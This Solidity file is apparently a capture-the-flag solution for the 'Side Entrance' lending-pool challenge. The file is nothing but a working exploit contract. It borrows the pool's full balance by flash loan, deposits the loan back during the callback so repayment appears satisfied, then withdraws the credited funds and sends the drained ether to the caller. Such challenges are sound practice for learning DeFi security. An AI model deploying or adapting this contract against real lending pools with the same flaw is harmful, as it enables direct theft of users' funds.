// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external payable;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver{
    using Address for address payable;

    function execute() external override payable{
        ISideEntranceLenderPool(msg.sender).deposit{ value : msg.value}();
    }

    // too lazy to implement ownable
    function attack(address pool) external {
        uint256 balance = address(pool).balance;
        ISideEntranceLenderPool(pool).flashLoan(balance);
        ISideEntranceLenderPool(pool).withdraw();
        balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    // to get drained eth
    receive() payable external{}

}